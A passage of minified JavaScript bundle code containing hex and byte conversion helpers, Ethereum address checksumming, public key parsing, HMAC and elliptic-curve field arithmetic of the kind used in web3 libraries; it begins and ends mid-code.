s=t[r];n.set(s,i),i+=s.length}return n}const Po=t=>typeof t=="bigint"&&Tc<=t;function Rc(t,e,n){return Po(t)&&Po(e)&&Po(n)&&e<=t&&t<n}function Cr(t,e,n,r){if(!Rc(e,n,r))throw new Error("expected valid "+t+": "+n+" <= n < "+r+", got "+e)}function Iv(t){let e;for(e=0;t>Tc;t>>=$a,e+=1);return e}const Gs=t=>($a<<BigInt(t))-$a,To=t=>new Uint8Array(t),xu=t=>Uint8Array.from(t);function Sv(t,e,n){if(typeof t!="number"||t<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof n!="function")throw new Error("hmacFn must be a function");let r=To(t),i=To(t),s=0;const o=()=>{r.fill(1),i.fill(0),s=0},a=(...h)=>n(i,r,...h),c=(h=To(0))=>{i=a(xu([0]),h),r=a(),h.length!==0&&(i=a(xu([1]),h),r=a())},l=()=>{if(s++>=1e3)throw new Error("drbg: tried 1000 values");let h=0;const f=[];for(;h<e;){r=a();const p=r.slice();f.push(p),h+=r.length}return Ss(...f)};return(h,f)=>{o(),c(h);let p;for(;!(p=f(l()));)c();return o(),p}}const Dv={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||Ti(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function Ys(t,e,n={}){const r=(i,s,o)=>{const a=Dv[s];if(typeof a!="function")throw new Error("invalid validator function");const c=t[i];if(!(o&&c===void 0)&&!a(c,t))throw new Error("param "+String(i)+" is invalid. Expected "+s+", got "+c)};for(const[i,s]of Object.entries(e))r(i,s,!1);for(const[i,s]of Object.entries(n))r(i,s,!0);return t}function _u(t){const e=new WeakMap;return(n,...r)=>{const i=e.get(n);if(i!==void 0)return i;const s=t(n,...r);return e.set(n,s),s}}function Av(t,e){if(Au(t)>e)throw new Gv({givenSize:Au(t),maxSize:e})}const Gt={zero:48,nine:57,A:65,F:70,a:97,f:102};function Iu(t){if(t>=Gt.zero&&t<=Gt.nine)return t-Gt.zero;if(t>=Gt.A&&t<=Gt.F)return t-(Gt.A-10);if(t>=Gt.a&&t<=Gt.f)return t-(Gt.a-10)}function Ov(t,e={}){const{dir:n,size:r=32}=e;if(r===0)return t;if(t.length>r)throw new Yv({size:t.length,targetSize:r,type:"Bytes"});const i=new Uint8Array(r);for(let s=0;s<r;s++){const o=n==="right";i[o?s:r-s-1]=t[o?s:t.length-s-1]}return i}function Ud(t,e){if(Pn(t)>e)throw new Mv({givenSize:Pn(t),maxSize:e})}function $v(t,e){if(typeof e=="number"&&e>0&&e>Pn(t)-1)throw new Fd({offset:e,position:"start",size:Pn(t)})}function Cv(t,e,n){if(typeof e=="number"&&typeof n=="number"&&Pn(t)!==n-e)throw new Fd({offset:n,position:"end",size:Pn(t)})}function Md(t,e={}){const{dir:n,size:r=32}=e;if(r===0)return t;const i=t.replace("0x","");if(i.length>r*2)throw new Lv({size:Math.ceil(i.length/2),targetSize:r,type:"Hex"});return`0x${i[n==="right"?"padEnd":"padStart"](r*2,"0")}`}const Pv="#__bigint";function kc(t,e,n){return JSON.stringify(t,(r,i)=>typeof i=="bigint"?i.toString()+Pv:i,n)}const Tv=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Bv(t,e={}){const{strict:n=!1}=e;if(!t)throw new Su(t);if(typeof t!="string")throw new Su(t);if(n&&!/^0x[0-9a-fA-F]*$/.test(t))throw new Du(t);if(!t.startsWith("0x"))throw new Du(t)}function Rv(...t){return`0x${t.reduce((e,n)=>e+n.replace("0x",""),"")}`}function Nc(t){return t instanceof Uint8Array?Ds(t):Array.isArray(t)?Ds(new Uint8Array(t)):t}function Ds(t,e={}){let n="";for(let i=0;i<t.length;i++)n+=Tv[t[i]];const r=`0x${n}`;return typeof e.size=="number"?(Ud(r,e.size),Ld(r,e.size)):r}function Bo(t,e={}){const{signed:n,size:r}=e,i=BigInt(t);let s;r?n?s=(1n<<BigInt(r)*8n-1n)-1n:s=2n**(BigInt(r)*8n)-1n:typeof t=="number"&&(s=BigInt(Number.MAX_SAFE_INTEGER));const o=typeof s=="bigint"&&n?-s-1n:0;if(s&&i>s||i<o){const l=typeof t=="bigint"?"n":"";throw new Uv({max:s?`${s}${l}`:void 0,min:`${o}${l}`,signed:n,size:r,value:`${t}${l}`})}const c=`0x${(n&&i<0?(1n<<BigInt(r*8))+BigInt(i):i).toString(16)}`;return r?kv(c,r):c}function kv(t,e){return Md(t,{dir:"left",size:e})}function Ld(t,e){return Md(t,{dir:"right",size:e})}function en(t,e,n,r={}){const{strict:i}=r;$v(t,e);const s=`0x${t.replace("0x","").slice((e??0)*2,(n??t.length)*2)}`;return i&&Cv(s,e,n),s}function Pn(t){return Math.ceil((t.length-2)/2)}function Nv(t,e={}){const{strict:n=!1}=e;try{return Bv(t,{strict:n}),!0}catch{return!1}}class Uv extends fe{constructor({max:e,min:n,signed:r,size:i,value:s}){super(`Number \`${s}\` is not in safe${i?` ${i*8}-bit`:""}${r?" signed":" unsigned"} integer range ${e?`(\`${n}\` to \`${e}\`)`:`(above \`${n}\`)`}`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.IntegerOutOfRangeError"})}}class Su extends fe{constructor(e){super(`Value \`${typeof e=="object"?kc(e):e}\` of type \`${typeof e}\` is an invalid hex type.`,{metaMessages:['Hex types must be represented as `"0x${string}"`.']}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.InvalidHexTypeError"})}}class Du extends fe{constructor(e){super(`Value \`${e}\` is an invalid hex value.`,{metaMessages:['Hex values must start with `"0x"` and contain only hexadecimal characters (0-9, a-f, A-F).']}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.InvalidHexValueError"})}}let Mv=class extends fe{constructor({givenSize:e,maxSize:n}){super(`Size cannot exceed \`${n}\` bytes. Given size: \`${e}\` bytes.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.SizeOverflowError"})}};class Fd extends fe{constructor({offset:e,position:n,size:r}){super(`Slice ${n==="start"?"starting":"ending"} at offset \`${e}\` is out-of-bounds (size: \`${r}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.SliceOffsetOutOfBoundsError"})}}let Lv=class extends fe{constructor({size:e,targetSize:n,type:r}){super(`${r.charAt(0).toUpperCase()}${r.slice(1).toLowerCase()} size (\`${e}\`) exceeds padding size (\`${n}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.SizeExceedsPaddingSizeError"})}};const Fv=new TextEncoder;function jv(t){if(!(t instanceof Uint8Array)){if(!t)throw new Ji(t);if(typeof t!="object")throw new Ji(t);if(!("BYTES_PER_ELEMENT"in t))throw new Ji(t);if(t.BYTES_PER_ELEMENT!==1||t.constructor.name!=="Uint8Array")throw new Ji(t)}}function qv(t){return t instanceof Uint8Array?t:typeof t=="string"?Vv(t):zv(t)}function zv(t){return t instanceof Uint8Array?t:new Uint8Array(t)}function Vv(t,e={}){const{size:n}=e;let r=t;n&&(Ud(t,n),r=Ld(t,n));let i=r.slice(2);i.length%2&&(i=`0${i}`);const s=i.length/2,o=new Uint8Array(s);for(let a=0,c=0;a<s;a++){const l=Iu(i.charCodeAt(c++)),u=Iu(i.charCodeAt(c++));if(l===void 0||u===void 0)throw new fe(`Invalid byte sequence ("${i[c-2]}${i[c-1]}" in "${i}").`);o[a]=l*16+u}return o}function Wv(t,e={}){const{size:n}=e,r=Fv.encode(t);return typeof n=="number"?(Av(r,n),Kv(r,n)):r}function Kv(t,e){return Ov(t,{dir:"right",size:e})}function Au(t){return t.length}function Hv(t){try{return jv(t),!0}catch{return!1}}class Ji extends fe{constructor(e){super(`Value \`${typeof e=="object"?kc(e):e}\` of type \`${typeof e}\` is an invalid Bytes value.`,{metaMessages:["Bytes values must be of type `Bytes`."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.InvalidBytesTypeError"})}}class Gv extends fe{constructor({givenSize:e,maxSize:n}){super(`Size cannot exceed \`${n}\` bytes. Given size: \`${e}\` bytes.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.SizeOverflowError"})}}class Yv extends fe{constructor({size:e,targetSize:n,type:r}){super(`${r.charAt(0).toUpperCase()}${r.slice(1).toLowerCase()} size (\`${e}\`) exceeds padding size (\`${n}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.SizeExceedsPaddingSizeError"})}}function jd(t,e={}){const{as:n=typeof t=="string"?"Hex":"Bytes"}=e,r=bv(qv(t));return n==="Bytes"?r:Ds(r)}class Zv extends Map{constructor(e){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=e}get(e){const n=super.get(e);return super.has(e)&&n!==void 0&&(this.delete(e),super.set(e,n)),n}set(e,n){if(super.set(e,n),this.maxSize&&this.size>this.maxSize){const r=this.keys().next().value;r&&this.delete(r)}return this}}const Xv={checksum:new Zv(8192)},Ro=Xv.checksum;function qd(t,e={}){const{compressed:n}=e,{prefix:r,x:i,y:s}=t;if(n===!1||typeof i=="bigint"&&typeof s=="bigint"){if(r!==4)throw new Ou({prefix:r,cause:new r2});return}if(n===!0||typeof i=="bigint"&&typeof s>"u"){if(r!==3&&r!==2)throw new Ou({prefix:r,cause:new n2});return}throw new t2({publicKey:t})}function Jv(t){const e=(()=>{if(Nv(t))return zd(t);if(Hv(t))return Qv(t);const{prefix:n,x:r,y:i}=t;return typeof r=="bigint"&&typeof i=="bigint"?{prefix:n??4,x:r,y:i}:{prefix:n,x:r}})();return qd(e),e}function Qv(t){return zd(Ds(t))}function zd(t){if(t.length!==132&&t.length!==130&&t.length!==68)throw new i2({publicKey:t});if(t.length===130){const r=BigInt(en(t,0,32)),i=BigInt(en(t,32,64));return{prefix:4,x:r,y:i}}if(t.length===132){const r=Number(en(t,0,1)),i=BigInt(en(t,1,33)),s=BigInt(en(t,33,65));return{prefix:r,x:i,y:s}}const e=Number(en(t,0,1)),n=BigInt(en(t,1,33));return{prefix:e,x:n}}function e2(t,e={}){qd(t);const{prefix:n,x:r,y:i}=t,{includePrefix:s=!0}=e;return Rv(s?Bo(n,{size:1}):"0x",Bo(r,{size:32}),typeof i=="bigint"?Bo(i,{size:32}):"0x")}class t2 extends fe{constructor({publicKey:e}){super(`Value \`${kc(e)}\` is not a valid public key.`,{metaMessages:["Public key must contain:","- an `x` and `prefix` value (compressed)","- an `x`, `y`, and `prefix` value (uncompressed)"]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidError"})}}class Ou extends fe{constructor({prefix:e,cause:n}){super(`Prefix "${e}" is invalid.`,{cause:n}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidPrefixError"})}}class n2 extends fe{constructor(){super("Prefix must be 2 or 3 for compressed public keys."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidCompressedPrefixError"})}}class r2 extends fe{constructor(){super("Prefix must be 4 for uncompressed public keys."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidUncompressedPrefixError"})}}let i2=class extends fe{constructor({publicKey:e}){super(`Value \`${e}\` is an invalid public key size.`,{metaMessages:["Expected: 33 bytes (compressed + prefix), 64 bytes (uncompressed) or 65 bytes (uncompressed + prefix).",`Received ${Pn(Nc(e))} bytes.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidSerializedSizeError"})}};const s2=/^0x[a-fA-F0-9]{40}$/;function Vd(t,e={}){const{strict:n=!0}=e;if(!s2.test(t))throw new $u({address:t,cause:new c2});if(n){if(t.toLowerCase()===t)return;if(Wd(t)!==t)throw new $u({address:t,cause:new l2})}}function Wd(t){if(Ro.has(t))return Ro.get(t);Vd(t,{strict:!1});const e=t.substring(2).toLowerCase(),n=jd(Wv(e),{as:"Bytes"}),r=e.split("");for(let s=0;s<40;s+=2)n[s>>1]>>4>=8&&r[s]&&(r[s]=r[s].toUpperCase()),(n[s>>1]&15)>=8&&r[s+1]&&(r[s+1]=r[s+1].toUpperCase());const i=`0x${r.join("")}`;return Ro.set(t,i),i}function o2(t,e={}){const{checksum:n=!1}=e;return Vd(t),n?Wd(t):t}function a2(t,e={}){const n=jd(`0x${e2(t).slice(4)}`).substring(26);return o2(`0x${n}`,e)}class $u extends fe{constructor({address:e,cause:n}){super(`Address "${e}" is invalid.`,{cause:n}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Address.InvalidAddressError"})}}class c2 extends fe{constructor(){super("Address is not a 20 byte (40 hexadecimal character) value."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Address.InvalidInputError"})}}class l2 extends fe{constructor(){super("Address does not match its checksum counterpart."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Address.InvalidChecksumError"})}}class Kd extends Cc{constructor(e,n){super(),this.finished=!1,this.destroyed=!1,K1(e);const r=Hs(n);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,s=new Uint8Array(i);s.set(r.length>i?e.create().update(r).digest():r);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),kr(s)}update(e){return Rr(this),this.iHash.update(e),this}digestInto(e){Rr(this),ir(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:n,iHash:r,finished:i,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=i,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=n._cloneInto(e.oHash),e.iHash=r._cloneInto(e.iHash),e}clone(){return this._cloneInto()}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}}const Hd=(t,e,n)=>new Kd(t,e).update(n).digest();Hd.create=(t,e)=>new Kd(t,e);const rt=BigInt(0),He=BigInt(1),Hn=BigInt(2),u2=BigInt(3),Gd=BigInt(4),Yd=BigInt(5),Zd=BigInt(8);function et(t,e){const n=t%e;return n>=rt?n:e+n}function pt(t,e,n){let r=t;for(;e-- >rt;)r*=r,r%=n;return r}function Ca(t,e){if(t===rt)throw new Error("invert: expected non-zero number");if(e<=rt)throw new Error("invert: expected positive modulus, got "+e);let n=et(t,e),r=e,i=rt,s=He;for(;n!==rt;){const a=r/n,c=r%n,l=i-s*a;r=n,n=c,i=s,s=l}if(r!==He)throw new Error("invert: does not exist");return et(i,e)}function Xd(t,e){const n=(t.ORDER+He)/Gd,r=t.pow(e,n);if(!t.eql(t.sqr(r),e))throw new Error("Cannot find square root");return r}function h2(t,e){const n=(t.ORDER-Yd)/Zd,r=t.mul(e,Hn),i=t.pow(r,n),s=t.mul(e,i),o=t.mul(t.mul(s,Hn),i),a=t.mul(s,t.sub(o,t.ONE));if(!t.eql(t.sqr(a),e))throw new Error("Cannot find square root");return a}function f2(t){if(t<BigInt(3))throw new Error("sqrt is not defined for small field");let e=t-He,n=0;for(;e%Hn===rt;)e/=Hn,n++;let r=Hn;const i=Uc(t);for(;Cu(i,r)===1;)if(r++>1e3)throw new Error("Cannot find square root: probably non-prime P");if(n===1)return Xd;let s=i.pow(r,e);const o=(e+He)/Hn;return function(c,l){if(c.is0(l))return l;if(Cu(c,l)!==1)throw new Error("Cannot find square root");let u=n,h=c.mul(c.ONE,s),f=c.pow(l,e),p=c.pow(l,o);for(;!c.eql(f,c.ONE);){if(c.is0(f))return c.ZERO;let d=1,g=c.sqr(f);for(;!c.eql(g,c.ONE);)if(d++,g=c.sqr(g),d===u)throw new Error("Cannot find square root");const w=He<<BigInt(u-d-1),_=c.pow(h,w);u=d,h=c.sqr(_),f=c.mul(f,h),p=c.mul(p,_)}return p}}function d2(t){return t%Gd===u2?Xd:t%Zd===Yd?h2:f2(t)}const p2=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function g2(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},n=p2.reduce((r,i)=>(r[i]="function",r),e);return Ys(t,n)}function y2(t,e,n){if(n<rt)throw new Error("invalid exponent, negatives unsupported");if(n===rt)return t.ONE;if(n===He)return e;let r=t.ONE,i=e;for(;n>rt;)n&He&&(r=t.mul(r,i)),i=t.sqr(i),n>>=He;return r}function Jd(t,e,n=!1){const r=new Array(e.length).fill(n?t.ZERO:void 0),i=e.reduce((o,a,c)=>t.is0(a)?o:(r[c]=o,t.mul(o,a)),t.ONE),s=t.inv(i);return e.reduceRight((o,a,c)=>t.is0(a)?o:(r[c]=t.mul(o,r[c]),t.mul(o,a)),s),r}function Cu(t,e){const n=(t.ORDER-He)/Hn,r=t.pow(e,n),i=t.eql(r,t.ONE),s=t.eql(r,t.ZERO),o=t.eql(r,t.neg(t.ONE));if(!i&&!s&&!o)throw new Error("invalid Legendre symbol result");return i?1:s?0:-1}function Qd(t,e){e!==void 0&&xi(e);const n=e!==void 0?e:t.toString(2).length,r=Math.ceil(n/8);return{nBitLength:n,nByteLength:r}}function Uc(t,e,n=!1,r={}){if(t<=rt)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:s}=Qd(t,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:t,isLE:n,BITS:i,BYTES:s,MASK:Gs(i),ZERO:rt,ONE:He,create:c=>et(c,t),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return rt<=c&&c<t},is0:c=>c===rt,isOdd:c=>(c&He)===He,neg:c=>et(-c,t),eql:(c,l)=>c===l,sqr:c=>et(c*c,t),add:(c,l)=>et(c+l,t),sub:(c,l)=>et(c-l,t),mul:(c,l)=>et(c*l,t),pow:(c,l)=>y2(a,c,l),div:(c,l)=>et(c*Ca(l,t),t),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>Ca(c,t),sqrt:r.sqrt||(c=>(o||(o=d2(t)),o(a,c))),toBytes:c=>n?Nd(c,s):Bi(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return n?kd(c):tr(c)},invertBatch:c=>Jd(a,c),cmov:(c,l,u)=>u?l:c});return Object.freeze(a)}function ep(t){if(typeof t!="bigint")throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function tp(t){const e=ep(t);return e+Math.ceil(e/2)}function m2(t,e,n=!1){const r=t.length,i=ep(e),s=tp(e);if(r<16||r<s||r>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+r);const o=n?kd(t):tr(t),a=et(o,e-He)+He;return n?Nd(a,i):Bi(a,i)}const Pu=BigInt(0),Pa=BigInt(1);function ko(t,e){const n=e.negate();return t?n:e}function np(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function No(t,e){np(t,e);const n=Math.ceil(e/t)+1,r=2**(t-1),i=2**t,s=Gs(t),o=BigInt(t);return{windows:n,windowSize:r,mask:s,maxNumber:i,shiftBy:o}}function Tu(t,e,n){const{windowSize:r,mask:i,maxNumber:s,shiftBy:o}=n;let a=Number(t&i),c=t>>o;a>r&&(a-=s,c+=Pa);const l=e*r,u=l+Math.abs(a)-1,h=a===0,f=a<0,p=e%2!==0;return{nextN:c,offset:u,isZero:h,isNeg:f,isNegF:p,offsetF:l}}function w2(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((n,r)=>{if(!(n instanceof e))throw new Error("invalid point at index "+r)})}function b2(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((n,r)=>{if(!e.isValid(n))throw new Error("invalid scalar at index "+r)})}const Uo=new WeakMap,rp=new WeakMap;function Mo(t){return rp.get(t)||1}function v2(t,e){return{constTimeNegate:ko,hasPrecomputes(n){return Mo(n)!==1},unsafeLadder(n,r,i=t.ZERO){let s=n;for(;r>Pu;)r&Pa&&(i=i.add(s)),s=s.double(),r>>=Pa;return i},precomputeWindow(n,r){const{windows:i,windowSize:s}=No(r,e),o=[];let a=n,c=a;for(let l=0;l<i;l++){c=a,o.push(c);for(let u=1;u<s;u++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(n,r,i){let s=t.ZERO,o=t.BASE;const a=No(n,e);for(let c=0;c<a.windows;c++){const{nextN:l,offset:u,isZero:h,isNeg:f,isNegF:p,offsetF:d}=Tu(i,c,a);i=l,h?o=o.add(ko(p,r[d])):s=s.add(ko(f,r[u]))}return{p:s,f:o}},wNAFUnsafe(n,r,i,s=t.ZERO){const o=No(n,e);for(let a=0;a<o.windows&&i!==Pu;a++){const{nextN:c,offset:l,isZero:u,isNeg:h}=Tu(i,a,o);if(i=c,!u){const f=r[l];s=s.add(h?f.negate():f)}}return s},getPrecomputes(n,r,i){let s=Uo.get(r);return s||(s=this.precomputeWindow(r,n),n!==1&&Uo.set(r,i(s))),s},wNAFCached(n,r,i){const s=Mo(n);return this.wNAF(s,this.getPrecomputes(s,n,i),r)},wNAFCachedUnsafe(n,r,i,s){const o=Mo(n);return o===1?this.unsafeLadder(n,r,s):this.wNAFUnsafe(o,this.getPrecomputes(o,n,i),r,s)},setWindowSize(n,r){np(r,e),rp.set(n,r),Uo.delete(n)}}}function E2(t,e,n,r){w2(n,t),b2(r,e);const i=n.length,s=r.length;if(i!==s)throw new Error("arrays of points and scalars must have equal length");const o=t.ZERO,a=Iv(BigInt(i));let c=1;a>12?c=a-3:a>4?c=a-2:a>0&&(c=2);const l=Gs(c),u=new Array(Number(l)+1).fill(o),h=Math.floor((e.BITS-1)/c)*c;let f=o;for(let p=h;p>=0;p-=c){u.fill(o);for(let g=0;g<s;g++){const w=r[g],_=Number(w>>BigInt(p)&l);u[_]=u[_].add(n[g])}let d=o;for(let g=u.length-1,w=o;g>0;g--)w=w.add(u[g]),d=d.add(w);if(f=f.add(d),p!==0)for(let g=0;g<c;g++)f=f.double()}return f}function ip(t){return g2(t.Fp),Ys(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...Qd(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}function Bu(t){t.lowS!==void 0&&_i("lowS",t.lowS),t.prehash!==void 0&&_i("prehash",t.prehash)}function x2(t){const e=ip(t);Ys(e,{a:"field",b:"field"},{allowInfinityPoint:"boolean",allowedPrivateKeyLengths:"array",clearCofactor:"function",fromBytes:"function",isTorsionFree:"function",toBytes:"function",wrapPrivateKey:"boolean"});const{endo:n,Fp:r,a:i}=e;if(n){if(!r.eql(i,r.ZERO))throw new Error("invalid endo: CURVE.a must be 0");if(typeof n!="object"||typeof n.beta!="bigint"||typeof n.splitScalar!="function")throw new Error('invalid endo: expected "beta": bigint and "splitScalar": function')}return Object.freeze({...e})}class _2 extends Error{constructor(e=""){super(e)}}const tn={Err:_2,_tlv:{encode:(t,e)=>{const{Err:n}=tn;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length&1)throw new n("tlv.encode: unpadded data");const r=e.length/2,i=Xi(r);if(i.length/2&128)throw new n("tlv.encode: long form length too big");const s=r>127?Xi(i.length/2|128):"";return Xi(t)+s+i+e},decode(t,e){const{Err:n}=tn;let r=0;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length<2||e[r++]!==t)throw new n("tlv.decode: wrong tlv");const i=e[r++],s=!!(i&128);let o=0;if(!s)o=i;else{const c=i&127;if(!c)throw new n("tlv.decode(long): indefinite length not supported");if(c>4)throw new n("tlv.decode(long): byte length is too big");const l=e.subarray(r,r+c);if(l.length!==c)throw new n("tlv.decode: length bytes not complete");if(l[0]===0)throw new n("tlv.decode(long): zero leftmost byte");for(const u of l)o=o<<8|u;if(r+=c,o<128)throw new n("tlv.decode(long): not minimal encoding")}const a=e.subarray(r,r+o);if(a.length!==o)throw new n("tlv.decode: wrong value length");return{v:a,l:e.subarray(r+o)}}},_int:{encode(t){const{Err:e}=tn;if(t<sn)throw new e("integer: negative integers are not allowed");let n=Xi(t);if(Number.parseInt(n[0],16)&8&&(n="00"+n),n.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return n},decode(t){const{Err:e}=tn;if(t[0]&128)throw new e("invalid signature integer: negative");if(t[0]===0&&!(t[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return tr(t)}},toSig(t){const{Err:e,_int:n,_tlv:r}=tn,i=wt("signature",t),{v:s,l:o}=r.decode(48,i);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l:c}=r.decode(2,s),{v:l,l:u}=r.decode(2,c);if(u.length)throw new e("invalid signature: left bytes after parsing");return{r:n.decode(a),s:n.decode(l)}},hexFromSig(t){const{_tlv:e,_int:n}=tn,r=e.encode(2,n.encode(t.r)),i=e.encode(2,n.encode(t.s)),s=r+i;return e.encode(48,s)}};function Lo(t,e){return Ii(Bi(t,e))}const sn=BigInt(0),Oe=BigInt(1);BigInt(2);const Fo=BigInt(3),I2=BigInt(4);function S2(t){const e=x2(t),{Fp:n}=e,r=Uc(e.n,e.nBitLength),i=e.toBytes||((v,b,x)=>{const O=b.toAffine();return Ss(Uint8Array.from([4]),n.toBytes(O.x),n.toBytes(O.y))}),s=e.fromBytes||(v=>{const b=v.subarray(1),x=n.fromBytes(b.subarray(0,n.BYTES)),O=n.fromBytes(b.subarray(n.BYTES,2*n.BYTES));return{x,y:O}});function o(v){const{a:b,b:x}=e,O=n.sqr(v),B=n.mul(O,v);return n.add(n.add(B,n.mul(v,b)),x)}function a(v,b){const x=n.sqr(b),O=o(v);return n.eql(x,O)}if(!a(e.Gx,e.Gy))throw new Error("bad curve params: generator point");const c=n.mul(n.pow(e.a,Fo),I2),l=n.mul(n.sqr(e.b),BigInt(27));if(n.is0(n.add(c,l)))throw new Error("bad curve params: a or b");function u(v){return Rc(v,Oe,e.n)}function h(v){const{allowedPrivateKeyLengths:b,nByteLength:x,wrapPrivateKey:O,n:B}=e;if(b&&typeof v!="bigint"){if(Ti(v)&&(v=Ii(v)),typeof v!="string"||!b.includes(v.length))throw new Error("invalid private key");v=v.padStart(x*2,"0")}let k;try{k=typeof v=="bigint"?v:tr(wt("private key",v,x))}catch{throw new Error("invalid private key, expected hex or "+x+" bytes, got "+typeof v)}return O&&(k=et(k,B)),Cr("private key",k,Oe,B),k}function f(v){if(!(v instanceof g))throw new Error("ProjectivePoint expected")}const p=_u((v,b)=>{const{px:x,py:O,pz:B}=v;if(n.eql(B,n.ONE))return{x,y:O};const k=v.is0();b==null&&(b=k?n.ONE:n.inv(B));const $=n.mul(x,b),N=n.mul(O,b),E=n.mul(B,b);if(k)return{x:n.ZERO,y:n.ZERO};if(!n.eql(E,n.ONE))throw new Error("invZ was invalid");return{x:$,y:N}}),d=_u(v=>{if(v.is0()){if(e.allowInfinityPoint&&!n.is0(v.py))return;throw new Error("bad point: ZERO")}const{x:b,y:x}=v.toAffine();if(!n.isValid(b)||!n.isValid(x))throw new Error("bad point: x or y not FE");if(!a(b,x))throw new Error("bad point: equation left != right");if(!v.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class g{constructor(b,x,O){if(b==null||!n.isValid(b))throw new Error("x required");if(x==null||!n.isValid(x)||n.is0(x))throw new Error("y required");if(O==null||!n.isValid(O))throw new Error("z required");this.px=b,this.py=x,this.pz=O,Object.freeze(this)}static fromAffine(b){const{x,y:O}=b||{};if(!b||!n.isValid(x)||!n.isValid(O))throw new Error("invalid affine point");if(b instanceof g)throw new Error("projective point not allowed");const B=k=>n.eql(k,n.ZERO);return B(x)&&B(O)?g.ZERO:new g(x,O,n.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(b){const x=Jd(n,b.map(O=>O.pz));return b.map((O,B)=>O.toAffine(x[B])).map(g.fromAffine)}static fromHex(b){const x=g.fromAffine(s(wt("pointHex",b)));return x.assertValidity(),x}static fromPrivateKey(b){return g.BASE.multiply(h(b))}static msm(b,x){return E2(g,r,b,x)}_setWindowSize(b){C.setWindowSize(this,b)}assertValidity(){d(this)}hasEvenY(){const{y:b}=this.toAffine();if(n.isOdd)return!n.isOdd(b);throw new Error("Field doesn't support isOdd")}equals(b){f(b);const{px:x,py:O,pz:B}=this,{px:k,py:$,pz:N}=b,E=n.eql(n.mul(x,N),n.mul(k,B)),S=n.eql(n.mul(O,N),n.mul($,B));return E&&S}negate(){return new g(this.px,n.neg(this.py),this.pz)}double(){const{a:b,b:x}=e,O=n.mul(x,Fo),{px:B,py:k,pz:$}=this;let N=n.ZERO,E=n.ZERO,S=n.ZERO,D=n.mul(B,B),P=n.mul(k,k),y=n.mul($,$),m=n.mul(B,k);return 